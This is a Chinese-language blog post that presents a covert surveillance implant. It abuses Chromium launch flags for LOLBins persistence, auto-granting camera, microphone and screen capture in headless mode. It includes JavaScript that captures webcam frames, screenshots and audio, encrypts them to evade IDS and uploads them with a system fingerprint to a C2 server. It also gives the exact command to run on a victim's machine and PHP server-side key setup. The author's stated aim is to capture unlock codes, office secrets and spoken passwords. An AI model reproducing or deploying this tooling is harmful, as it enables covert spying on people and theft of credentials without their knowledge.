---
layout:     post                       
title:     基于Chromium启动参数的LOLBins权限维持 
subtitle:   
date:       2025-09-02       
author:     Closure                         
header-img: img/0727.jpg
catalog: true                         
tags:                               
    - 笔记
    - 安全
---

还没有彻底开源，现在机子只有mac，等试完win和linux之后都能顺利捕获摄像头和麦克风再放主页qwq前几张是失败的，后面那几张是成功之后的。

![ ](/img/20250901-1.png)
![ ](/img/20250901-2.png)

### LOLBins权限维持

权限维持的东西，LOLBins的核心攻击思想是放弃使用容易被检测的&需要上传到目标机器的恶意软件，转而滥用目标操作系统中已存在且受信任的合法程序来执行操作。

这次所有都围绕将带有特殊参数的Chrome启动命令，作为一个休眠的playload来植入到系统的自启动机制中。Chromium启动参数是在启动像Chrome Edge Opera这些基于Chromium内核的浏览器时，附加在可执行文件之后的一系列指令，这些指令的作用是改变和覆盖浏览器的默认行为，然后开启实验性功能和禁用安全策略。

但是启动参数数量太大了，只能概括一下将其分为几大类。

**Interface & Performance**

* --start-maximized: 启动时窗口直接最大化。
* --incognito: 以隐身模式启动。
* --disable-extensions: 禁用所有扩展程序，便于排查问题。
* --disable-gpu: 禁用GPU硬件加速。在无头模式或解决渲染问题时非常有用。
* --disk-cache-dir: 指定一个自定义的缓存目录。

**Automation & Testing**

* --headless: 以无头模式运行。浏览器将在后台运行，没有用户界面，完全隐形。
* --remote-debugging-port=9222: 开启远程调试协议，允许Puppeteer、Selenium等自动化工具控制浏览器。
* --screenshot: 启动浏览器，对指定URL截一张图，然后自动退出。
* --print-to-pdf="C:\file.pdf": 将指定URL的内容打印成PDF文件并保存。

**Security Policy & Privacy**

* --user-data-dir="<路径>": (极其重要) 指定一个独立的用户数据目录。在红队攻击中，这用于创建一个“无痕”的、与用户正常浏览器完全隔离的运行环境。
* --proxy-server="[地址:端口](%E5%9C%B0%E5%9D%80:%E7%AB%AF%E5%8F%A3)": 强制浏览器通过指定的代理服务器联网，用于流量转发和伪装。
* --ignore-certificate-errors: (高风险) 忽略所有HTTPS证书错误，让浏览器连接到使用了无效或自签名证书的网站。
* --disable-web-security: (极高风险) 禁用同源策略等Web安全核心功能，允许页面跨域请求资源。在开发中用于调试，但在攻击中可能被用于信息窃取。

**Permission Bypassing**

* --auto-accept-camera-and-microphone-capture: (攻击核心) 自动同意网页使用摄像头和麦克风的权限请求。
* --auto-select-desktop-capture-source="Entire screen": (攻击核心) 自动同意网页共享整个屏幕的请求。
* --use-fake-ui-for-media-stream: 创建一个虚假的媒体捕获界面，而不是真实的弹窗，用于欺骗或自动化测试。

完整的在这里 https://peter.sh/experiments/chromium-command-line-switches/

https://mrd0x.com/spying-with-chromium-browsers-camera/

基于这篇的思路自己做了优化，这一篇是演示如何在Chromium系浏览器中利用一个特殊的启动参数 **--auto-accept-camera-and-microphone-capture**，结合 headless模式实现完全绕过用户交互的摄像头与麦克风监听。

文章里面的代码< video> 和 < canvas> 组合不断从视频流中截取帧，每隔3秒调用一次takeAndUploadSnapshot()，把截图转换为Base64 POST upload.php。后端接收JSON请求解码Base64数据。

我的思路和他一样都是前端采集摄像头 + 麦克风 → 上传 → 存储，这篇文章是实验性质的，文章的PoC属于硬编码 Demo，只能快照录音，但是上传路径间隔命名都写死了无法动态控制采集策略也没法扩展Reco搜索 API集成（

我数据传输优化的部分是用AES-256-CBC对图片音频数据加密再通过 RSA-OAEP 混合加密传输，每次采集都生成随机初始化向量，公钥放在config.json中支持热更新。后端也加了其他的逻辑。

### 权限维持

拿到实时摄像头的价值我想了一下应该是可以捕捉到目标在解锁手机时输入的图形和数字密码，因为基于线上对键盘记录器没法获取在其他设备上输入的密码。如果放在企业环境下就是办公室里的白板 显示器上便利贴是泄露系统架构 内网IP地址 临时密码的重灾区，还观察到员工工牌的样式为后续的物理渗透做准备。

音频监控在很多场景下比上面的视频更有破坏性，毕竟麦克风没有物理指示灯可以拿来当一个更隐蔽的传感器，说不定能偷听到口述密码（?

所以这次除了标准的远程动态配置和任务分发系统&指纹采集外，新的权限维持的功能有摄像头自开启 音频录制。

```
`takeAndUploadSnapshot()

async function takeAndUploadSnapshot() {
    let sourceName;
    
    let currentMode = config.mode;
    if (config.task.type === 'recon') currentMode = 'screen_only';`
```

根据配置文件config.json确定当前快照模式，只拍摄屏幕、只拍摄摄像头或交替拍摄。

```
setActiveTrack(captureMode);
await video.play();

video.oncanplay = () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    video.pause();

    const base64data = canvas.toDataURL('image/jpeg', config.quality);
```

把video标签绑定到摄像头或屏幕流，然后把视频帧渲染到< canvas>，调用 *canvas.toDataURL()*生成Base64格式的JPEG图片。这就是完全基于浏览器 API，不需要安装木马或驱动，这个我写成支持配置画质压缩*config.quality*来降低流量特征

AES-256加密成Base64 图片，RSA 公钥加密成AES密钥，上传 JSON encryptedKey + ciphertext + iv。双层加密让流量几乎无法通过特征匹配检测，还可以可以绕 IDS。

```
const aesKey = CryptoJS.lib.WordArray.random(32);
        const iv = CryptoJS.lib.WordArray.random(16);
        const encryptedData = CryptoJS.AES.encrypt(base64data, aesKey, { iv: iv });

        const rsaEncrypt = new JSEncrypt();
        rsaEncrypt.setPublicKey(config.publicKey);
        const encryptedKey = rsaEncrypt.encrypt(aesKey.toString(CryptoJS.enc.Hex));
        if (!encryptedKey) return;

        const dataToUpload = {
            encryptedKey: encryptedKey,
            ciphertext: encryptedData.ciphertext.toString(CryptoJS.enc.Base64),
            iv: iv.toString(CryptoJS.enc.Base64),
            filename: `${sourceName}Capture-${Date.now()}.jpg`,
            fingerprint: fingerprintData
        };
                
        uploadData(dataToUpload);
        fingerprintData = null;
```

AES-256加密成Base64 图片，RSA 公钥加密成AES密钥，上传 JSON encryptedKey + ciphertext + iv。双层加密让流量几乎无法通过特征匹配检测，还可以可以绕 IDS。

```
recordAndUploadAudio()

async function recordAndUploadAudio() {
    console.log(`开始执行录音任务...`);
    try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
        const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
        let recordedChunks = [];

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };
```

调用浏览器* getUserMedia({ audio:true })* 获取麦克风，再用MediaRecorder录制成WebM格式。分片缓存在recordedChunks。

音频编码和上传和图片逻辑一样，然后我控制了录音时长通过config.json动态下发，可以实时开启或关闭监听。

### 后端

主要有两个核心任务：快照采集和音频录制，无论是截屏还是录音，最后都会调用*uploadData(dataToUpload)*。

dataToUpload 结构是这样的：

{
"encryptedKey": "...",   // RSA加密后的 AES 密钥
"ciphertext": "...",     // AES加密后的快照/音频数据
"iv": "...",             // AES初始化向量
"filename": "camCapture-...jpg",
"fingerprint": {...}     // 系统指纹
}

前端在采集视频音频后，会先使用AES-256-CBC对文件内容加密和随机生成 AES 密钥 & IV，然后使用 RSA公钥加密AES密钥，最后再通过 POST 以 JSON 格式发送到后端。这里是 用服务器私钥解出AES密钥，验证MIME类型 文件大小，把文件保存在安全目录再把指纹数据写入日志。

后端其他的懒得写了，就是常见的安全措施……….

### 部署

`"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --disable-gpu --user-data-dir="C:\Users\Public\temp_chrome_session" --ignore-certificate-errors --auto-accept-camera-and-microphone-capture --auto-select-desktop-capture-source="Entire screen" "https://c2地址/capture.html"`

受害者机子上直接跑这条命令，**--headless**参数是Chrome实例完全在后台运行，没有任何可见的窗口。**—user-data-dir="C:\Users\Public\temp_chrome_session"**参数是指定了一个临时的位于公共目录的用户配置文件，本次操作与用户正常的浏览器使用完全隔离，所有访问记录缓存Cookie都保存在这个临时目录中，不会污染常规历史记录。

接下来就是上面写的，为capture.赋予之前没有的特权**，—ignore-certificate-errors**参数强制浏览器无条件信任目标服务器的HTTPS证书，即使该证书是伪造过期的。在此基础上，**--auto-accept-camera-and-microphone-capture和--auto-select-desktop-capture-source="Entire screen"**这两个参数是绕过了浏览器最关键的安全机制，用户授权弹窗，以编程方式代替用户点击了允许自动授予了网页访问摄像头麦克风和整个屏幕的最高权限。

最后就是连俺们的c2。

前期就是需要自己的VPS，PHP启用openssl扩展。

然后在自己服务器上生成RSA密钥对

`<?php $config = [ "digest_alg" => "sha512", "private_key_bits" => 2048, "private_key_type" => OPENSSL_KEYTYPE_RSA, ]; $res = openssl_pkey_new($config); if (!$res) { exit("无法生成密钥对。\n"); } openssl_pkey_export($res, $private_key); file_put_contents('private_key.pem', $private_key); $public_key = openssl_pkey_get_details($res)["key"]; file_put_contents('public_key.pem', $public_key); echo "密钥对生成成功: private_key.pem 和 public_key.pem\n"; ?>`

执行之后当前目录下会生成private_key.pem和 public_key.pem两个文件，private_key.pem为了安全移动到Web根目录之外的安全位置，相应修改upload.php中的$privateKeyPath变量。

然后就是执行Chromium启动命令来激活。

